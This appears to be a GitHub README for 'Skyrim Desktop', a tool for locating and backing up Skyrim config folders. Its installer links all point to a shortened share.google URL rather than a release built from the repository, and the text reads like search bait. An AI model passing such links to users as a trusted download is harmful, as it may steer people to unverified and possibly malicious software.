![Skyrim Desktop](assets/hero.png)

# Skyrim Desktop

*Find the Skyrim folder fast and keep a local spare.*

## About

**Skyrim Desktop** runs on your own PC. Local Windows and macOS helper for Skyrim data paths, config and export caches, and export folders.

Skyrim config and export files hide under AppData and Documents.

Use it when you want the change on this machine without opening a dozen Settings pages.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Maps Skyrim data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Background

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/henrmitchell976/skyrim-desktop

MIT license. See `LICENSE`.
